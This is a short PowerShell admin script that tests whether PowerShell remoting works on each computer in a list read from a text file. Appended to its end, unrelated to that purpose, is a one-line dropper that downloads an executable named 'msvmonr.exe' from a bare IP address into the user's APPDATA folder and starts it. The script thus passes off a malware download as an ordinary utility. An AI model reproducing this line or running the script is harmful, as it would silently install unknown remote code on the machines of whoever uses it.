function Test-PsRemoting
{
    param(
        [Parameter(Mandatory = $true)]
        $computername
    )
   
    try
    {
        $errorActionPreference = "Stop"
        $result = Invoke-Command -ComputerName $computername { 1 }
    }
    catch
    {
        Write-Host $computername $false
		return $false
    }
   
    
    
    if($result -ne 1)
    {
        Write-Verbose "Remoting to $computerName returned an unexpected result."
        return $false
    } 
	Write-Host $computername $true   
} 

$Computers = Get-Content e:\dexma\logs\computers.txt

Foreach ($Computer IN $Computers) {
	Test-PsRemoting -ComputerName $Computer
}
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

